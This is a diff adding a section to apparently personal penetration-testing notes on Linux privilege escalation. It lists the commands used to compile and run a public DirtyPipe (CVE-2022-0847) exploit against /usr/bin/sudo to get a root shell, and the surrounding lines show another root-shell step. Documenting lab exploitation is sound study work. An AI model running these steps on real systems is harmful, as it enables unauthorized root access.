@@ -2496,6 +2496,22 @@ ls -l ld.so.preload # Now the file is available
 /tmp/rootshell
 #Drops root shell
 ```
+### DirtyPipe - CVE-2022-0847 - Linux Exploit
+
+- After running the linpeas.sh identified DirtyPipe in that PrivEsc list identified this exploit
+- Resource from the [Github](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)
+- First check GCC installed on the  target machine
+```bash
+gcc --version
+./ sh compile.sh # No luck
+sh compile.sh /usr/bin/sudo
+./compile.sh /usr/bin/sudo
+# Downloaded exploit-2.c from above Github repository
+gcc -o exploit-2 exploit-2.c
+./exploit-2 /usr/bin/sudo
+# Got root shell
+
+```
 
 # Resources
 - [Linux Exploits GTFOBins](https://gtfobins.github.io/)
